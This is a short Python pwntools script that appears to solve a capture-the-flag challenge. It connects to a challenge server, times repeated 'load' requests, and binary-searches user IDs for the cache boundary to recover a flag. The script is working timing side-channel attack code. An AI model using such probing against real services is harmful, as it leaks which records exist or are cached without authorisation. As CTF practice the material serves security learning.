#!/usr/bin/env python3
from pwn import *
import time

r = remote("chals.disorientation.cssa.club", 5558)

def query(uid):
    t = time.time()
    r.sendline(f"load {uid}".encode())
    resp = r.recvline()
    elapsed = time.time() - t
    print(f"UID {uid}: {resp.strip().decode()} ({elapsed:.3f}s)")
    return elapsed

def is_cached(uid, samples=3, threshold=0.5):
    times = [query(uid) for _ in range(samples)]
    return min(times) < threshold

def binary_search_hacker(lo=0, hi=9999):
    while lo < hi:
        mid = (lo + hi) // 2
        # cached: boundary is at mid or to the left
        if is_cached(mid):
            hi = mid   
        # not cached: boundary is to the right
        else:
            lo = mid + 1  
    return lo

hacker_uid = binary_search_hacker()
print(f"Flag: disorientation{{u{hacker_uid:04d}}}")
r.close()
